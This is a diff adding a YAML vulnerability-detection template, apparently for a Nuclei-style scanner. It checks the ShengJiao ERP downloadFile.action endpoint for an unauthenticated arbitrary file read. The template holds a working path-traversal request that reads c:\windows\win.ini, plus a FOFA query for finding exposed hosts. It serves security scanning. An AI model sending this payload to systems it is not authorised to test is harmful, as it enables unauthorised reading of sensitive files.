@@ -1,0 +1,29 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - for 16-bit app support
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/erp/wap/../downloadFile.action?absolutePath=true&file=c:\\windows\\win.ini'
+id: shengjiao-erp-downloadfile-fileread
+info:
+  author: ZacharyZcR
+  description: |
+    ShengJiao ERP System downloadFile.action has an arbitrary file read vulnerability.
+    Unauthenticated attackers can exploit this vulnerability to read important system files.
+    FOFA: app="圣乔-ERP系统"
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: ShengJiao ERP downloadFile.action Arbitrary File Read
+  severity: high
+  tags: shengqiao,erp,lfi,fileread,argus-import
